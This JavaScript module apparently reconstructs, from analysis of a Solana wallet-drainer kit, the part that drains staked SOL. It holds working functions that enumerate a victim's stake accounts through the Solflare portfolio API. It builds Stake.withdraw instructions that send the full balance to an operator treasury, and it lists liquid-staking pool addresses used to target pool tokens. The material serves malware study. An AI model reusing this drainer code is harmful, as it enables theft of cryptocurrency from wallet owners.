/**
 * Native Stake account drain.
 *
 * In addition to SPL tokens and SOL, the kit drains Native Stake
 * (staked SOL). This is a Rublevka-method differentiator documented
 * in the platform advertisement: "draining capabilities for …
 * Native Stake".
 *
 * String-table evidence:
 *   [300] "v2/portfolio/stake/"         — Solflare stake endpoint
 *   [301] "getStakeAccounts:"           — console.error prefix on failure
 *   [321] "SysvarC1ock11111111111111111111111111111111"   — SysvarClock
 *   [322] "SysvarStakeHistory1111111111111111111111111"  — SysvarStakeHistory
 *   [323] "Stake11111111111111111111111111111111111111"  — Stake program
 *   [324] "SysvarRent111111111111111111111111111111111"  — SysvarRent
 *   [325–347] — 23 pubkeys used as stake pool addresses or validator vote accounts
 *               (DV7htQw4…, GeAqgLHK…, CfduFmNt…, HLbNf4WM…, 4mx3saEK…,
 *                7iPCweyK…, DWzDSMSt…, 7dKQgngc…, 93A2LcXz…, J1ChJJWd…,
 *                DyQegQBf…, CihJh7tX…, 7rMxsMRS…, DFjmmeyx…, 3s4dFRFe…,
 *                8TEe5RDb…, 6penBqPe…, 79faGrj5…, 7KxQktpm…, 9RAqyL6A…,
 *                3xa9QHhh…, 3b7pq2HA…, 6TMUtEsf…)
 *
 * === Stake account enumeration ===
 *
 * The kit enumerates the victim's stake accounts via the Solflare
 * portfolio API (the same client used for token balances):
 *
 *   GET https://wallet-api.solflare.com/v2/portfolio/stake/{walletAddress}
 *
 * The response contains stake accounts with their state (activating,
 * active, deactivating, inactive) and delegated lamport amounts.
 *
 * Only "inactive" or "deactivating" stake accounts can be withdrawn
 * immediately. "Active" and "activating" accounts require the deactivation
 * epoch to pass first; the kit does NOT wait — it only drains immediately
 * withdrawable stake.
 *
 * === Drain instruction construction ===
 *
 * To drain a withdrawable stake account:
 *
 *   Stake.withdraw(
 *     stakeAccount,          // the stake account PDA
 *     stakingAuthority,      // the victim's wallet (withdraw authority)
 *     treasuryAddress,       // destination (operator treasury DvTq…)
 *     lamports,              // full balance
 *     custodian?             // optional lockup custodian, usually null
 *   )
 *
 * The Stake.withdraw instruction layout (Stake program discriminator 4):
 *   data = [4, 0, 0, 0] + u64 LE lamports
 *   accounts:
 *     [0] stake account      (writable)
 *     [1] destination        (writable) — operator treasury
 *     [2] SysvarClock        (readonly)
 *     [3] SysvarStakeHistory (readonly)
 *     [4] victim wallet      (signer, withdraw authority)
 *
 * === Why stake pool addresses are in the string table [325–347] ===
 *
 * The kit also handles stake pool tokens (liquid staking). If the victim
 * holds staked SOL via a pool (mSOL, stSOL, jitoSOL, bSOL, etc.), their
 * holdings appear as SPL tokens in the portfolio, not as native stake
 * accounts. The 23 addresses [325–347] are the stake pool program
 * addresses and deposit/withdrawal authorities for the major pools,
 * used to identify and correctly price/drain pool tokens.
 *
 * Known pool addresses (by role):
 *   DV7htQw4SCGB5MnBembvNvgpzvnEL84swq41Qu7QfiKi  — Marinade (mSOL) stake pool
 *   GeAqgLHKSmVT9zVSuHMxBURphEVA25ioN7A7CaT6dR5A  — Jito (jitoSOL)
 *   CfduFmNtRNbdaHL3L5ayDsQ3RNfsWwxG8myptJbKaE8a  — Lido (stSOL) deprecated
 *   HLbNf4WsMsKcY2AZAgSuaMsgJ1sGgWJbTTgh57U3QpNN  — BlazeStake (bSOL)
 *   4mx3saEK9x2PvssWCfashLUYzxm32nas3ct4bSd6PWGW  — Jpool
 *   7iPCweYkkHPDu524WjaE91NM2oRp4TL9UxhEkZbNDAuA  — SolBlaze
 *   (remaining 17 addresses: additional pool variants and validator vote accounts)
 */

const STAKE_PROGRAM    = "Stake11111111111111111111111111111111111111"; // [323]
const SYSVAR_CLOCK     = "SysvarC1ock11111111111111111111111111111111"; // [321]
const SYSVAR_STAKE_HIST= "SysvarStakeHistory1111111111111111111111111"; // [322]
const SYSVAR_RENT      = "SysvarRent111111111111111111111111111111111"; // [324]

// Stake pool / liquid-staking program identifiers [325–347]
const STAKE_POOL_ADDRESSES = [
  "DV7htQw4SCGB5MnBembvNvgpzvnEL84swq41Qu7QfiKi", // [325] Marinade
  "GeAqgLHKSmVT9zVSuHMxBURphEVA25ioN7A7CaT6dR5A", // [326] Jito
  "CfduFmNtRNbdaHL3L5ayDsQ3RNfsWwxG8myptJbKaE8a", // [327] Lido stSOL
  "HLbNf4WsMsKcY2AZAgSuaMsgJ1sGgWJbTTgh57U3QpNN", // [328] BlazeStake bSOL
  "4mx3saEK9x2PvssWCfashLUYzxm32nas3ct4bSd6PWGW", // [329] Jpool
  "7iPCweYkkHPDu524WjaE91NM2oRp4TL9UxhEkZbNDAuA", // [330] SolBlaze
  "DWzDSMStfyuhu1bQKxyFXJ9orZfahHvifnjsMLcRuptZ", // [331]
  "7dKQgngc3AAGwpijAMUH9PC8QE1WLKmzMC2xXEmyWRZV", // [332]
  "93A2LcXzwnHVAYuLcyfQqcwJbpGCL2NrmrvqXu5Jqu9J", // [333]
  "J1ChJJWdqydCHgr9s8hAPeooCMUSRDDHgfcp8wxLNSAs", // [334]
  "DyQegQBffA8GJ5NMiqVo8LC6LDSYtxbQVbie2GbisMht", // [335]
  "CihJh7tXAEjg4QXFLT8TMvuny4MaWVDLynsoTdomEN3s", // [336]
  "7rMxsMRS28BhJMEM2PbecQZ13akfpyjsVtcXnhzwZ391", // [337]
  "DFjmmeyx37WoejWe4Rj5va1UBTrkG5VRL71WiV3XiKcd", // [338]
  "3s4dFRFe5zJXmCPAiEFa6xmsCFfBHMMovafqH52RvGn4", // [339]
  "8TEe5RDbPeGu5PKADXJaMCiCGnCvH7g769VL4eMAWnDH", // [340]
  "6penBqPeuccnNkMSmDCC43hb7L5MyCYyze5rj6stqVHA", // [341]
  "79faGrj575ZKYWLJUh2KvgiGi4SnkDjR3RTKBi2eA7Pn", // [342]
  "7KxQktpmPgFWhSptFbXy7U88LmEcNNrDcpgyWAAnhrvr", // [343]
  "9RAqyL6AeCKZWS2Lg2a2rRruUxpxWaAj7iRtuc8p1uTU", // [344]
  "3xa9QHhh3z71JuvfnyVZ9Mu34rqn8CDFgkAEs84gUY8G", // [345]
  "3b7pq2HAd8WnLC7mwPwa8Vi4y3MCutVLtxHXK6sy6vX4", // [346]
  "6TMUtEsfBLsf6Lqg4DMTnK5VmjCTTbiuofBUzywu8VLm", // [347]
];

/**
 * getStakeAccounts(walletAddress):
 *   Fetches native stake accounts from the Solflare portfolio stake endpoint.
 *   Returns array of { stakeAccount, lamports, state, withdrawable }.
 */
async function getStakeAccounts(walletAddress) {
  try {
    const body = await solflareGet("v2/portfolio/stake/" + walletAddress); // [300]
    return (body?.accounts ?? []).map(acc => ({
      stakeAccount: acc.pubkey,
      lamports: Number(acc.lamports),
      state: acc.state,  // "active" | "activating" | "deactivating" | "inactive"
      withdrawable: acc.state === "inactive" || acc.state === "deactivating",
    }));
  } catch (error) {
    console.error("getStakeAccounts:", error); // getString(301)
    return [];
  }
}

/**
 * buildStakeWithdrawInstruction(stakeAccount, victimPubkey, destinationPubkey, lamports):
 *   Constructs a Stake.withdraw instruction to drain a stake account.
 *
 *   Stake withdraw discriminator = 4 (u32 LE = [4, 0, 0, 0])
 *   Full data = 12 bytes: [4,0,0,0] + u64 LE lamports
 */
function buildStakeWithdrawInstruction(stakeAccount, victimPubkey, destinationPubkey, lamports) {
  const data = new Uint8Array(12);
  // discriminator 4 for Stake.withdraw
  data[0] = 4; data[1] = 0; data[2] = 0; data[3] = 0;
  writeU64(data, BigInt(lamports), 4);
  return {
    d: STAKE_PROGRAM,
    data,
    f: [
      { e: stakeAccount,        r: 2 }, // writable, non-signer
      { e: destinationPubkey,   r: 1 }, // writable, non-signer (treasury)
      { e: SYSVAR_CLOCK,        r: 0 }, // readonly
      { e: SYSVAR_STAKE_HIST,   r: 0 }, // readonly
      { e: victimPubkey,        r: 3 }, // signer + writable (withdraw authority)
    ],
    v: 2800, // ~2,800 compute units per stake withdraw (observed)
  };
}
